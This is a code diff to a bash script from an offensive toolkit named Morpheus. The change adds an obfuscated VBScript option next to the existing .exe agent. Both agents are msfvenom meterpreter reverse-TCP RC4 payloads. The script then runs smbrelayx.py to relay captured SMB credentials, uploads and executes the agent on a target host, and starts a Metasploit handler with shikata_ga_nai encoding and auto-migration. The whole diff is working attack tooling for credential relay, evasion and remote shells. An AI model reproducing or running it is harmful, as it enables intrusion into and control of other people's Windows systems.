@@ -2793,11 +2793,21 @@ fi
 
 
 #
-# build payload and trigger
+# build payload (.exe|.vbs) and trigger.bat
 #
-echo ${BlueF}[☠]${white} Building rc4 agent.exe ..${Reset};
-sleep 2
-xterm -T "MORPHEUS - BUILD AGENT.EXE" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f exe -n 20 -o $IPATH/output/agent.exe"
+form=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "Build binary.exe agent" FALSE "Build VBScript agent" --width 320 --height 200) > /dev/null 2>&1
+if [ "$form" = "Build binary.exe agent" ]; then
+  echo ${BlueF}[☠]${white} Building rc4 agent.exe ..${Reset};
+  sleep 2
+  xterm -T "MORPHEUS - BUILD AGENT.exe" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f exe -n 20 -o $IPATH/output/agent.exe"
+else
+  echo ${BlueF}[☠]${white} Building rc4 agent.vbs ..${Reset};
+  sleep 2
+  xterm -T "MORPHEUS - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
+  disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
+  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"-wINe\"+\"NPo\"&\"WeR1\"+\"no\"+\"PS\"&\"hElL\":f0wBiQ=mId(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" 1 \"&Mid(U1kJi0,1,4)&\" \"&MiD(U1kJi0,12,1)&\" \"&mId(U1kJi0,1,1)&mID(U1kJi0,13,3)&\" \"&MiD(U1kJi0,1,1)&miD(U1kJi0,5,2)&\" \"&\"$disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ+\", 0}\"" > $IPATH/output/agent.vbs
+fi
+
 
 
 #
@@ -2812,8 +2822,7 @@ xterm -T "MORPHEUS - BUILD AGENT.EXE" -geometry 110x23 -e "msfvenom -p windows/m
 # remove everything after the final [ . ]
 parse=`echo ${IP%.*}`
 
-# Now, lets simulate the scanner (trigger.bat) by attempting to connect to the C$
-# of our attackers Linux box (192.168.1.71) from the scanner server (192.168.1.19)
+# Now, lets simulate the scanner (trigger.bat) by attempting to connect to the C$ share
 # STRING: FOR /L %%i IN (1,1,255) DO dir \\192.168.1.%%i\c$
 echo ${BlueF}[☠]${white} Building trigger.bat ..${Reset};
 sleep 2
@@ -2824,7 +2833,11 @@ mv done.bat $IPATH/output/trigger.bat
 #
 # final notes ..
 #
+if [ "$form" = "Build binary.exe agent" ]; then
 zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the SmbRelay lateral\nmovement attack as soon we click the 'yes' button.\n\nIf we wish to [ manually ] trigger the vulnerability\nthen we are going to need a 3º PC were we are going\nto execute the [ trigger.bat ] file to simulate one smb\nauth attempt on local lan so that morpheus can use\nthat captured credentials to upload/execute our\nagent.exe into target PC [ RHOST ]" --info --width 360 --height 270 > /dev/null 2>&1
+else
+zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the SmbRelay lateral\nmovement attack as soon we click the 'yes' button.\n\nIf we wish to [ manually ] trigger the vulnerability\nthen we are going to need a 3º PC were we are going\nto execute the [ trigger.bat ] file to simulate one smb\nauth attempt on local lan so that morpheus can use\nthat captured credentials to upload/execute our\nagent.vbs into target PC [ RHOST ]" --info --width 360 --height 270 > /dev/null 2>&1
+fi
 
 
 #
@@ -2832,8 +2845,13 @@ zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the S
 #
 cd $IPATH/bin/Utils
 echo ""
+if [ "$form" = "Build binary.exe agent" ]; then
 python smbrelayx.py -h $rhost -e $IPATH/output/agent.exe & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp_rc4; set RC4PASSWORD phobetor; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
+else
+python smbrelayx.py -h $rhost -e $IPATH/output/agent.vbs & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp_rc4; set RC4PASSWORD phobetor; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
+fi
 echo ""
+
 
 #
 # clean
@@ -2844,6 +2862,7 @@ service postgresql stop > /dev/null 2>&1
 cd $IPATH/output/
 killall python > /dev/null 2>&1
 rm trigger.bat > /dev/null 2>&1
+rm chars.raw > /dev/null 2>&1
 
 
 #
